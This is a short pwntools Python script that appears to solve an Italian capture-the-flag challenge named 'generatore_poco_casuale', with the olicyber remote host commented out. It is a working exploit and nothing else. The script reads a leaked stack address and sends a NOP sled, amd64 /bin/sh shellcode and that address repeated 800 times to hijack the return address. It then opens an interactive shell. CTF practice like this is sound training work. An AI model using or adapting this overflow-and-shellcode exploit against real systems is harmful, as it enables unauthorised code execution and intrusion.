from pwn import *

p = gdb.debug("./generatore_poco_casuale", gdbscript="""
    b *randomGenerator+149
""")

# p = remote("gpc.challs.olicyber.it", 10104)

p.recvuntil(b": ")
addr = int(p.recvline().decode().strip())
p.recvuntil(b"(s/n)")

nop_sled  = b"\x90" * 31
shellcode = asm(shellcraft.amd64.linux.sh(), arch='x86_64')

payload  = b"s"
payload += nop_sled
payload += shellcode
payload += p64(addr + 1) * 800

p.sendline(payload)
p.interactive()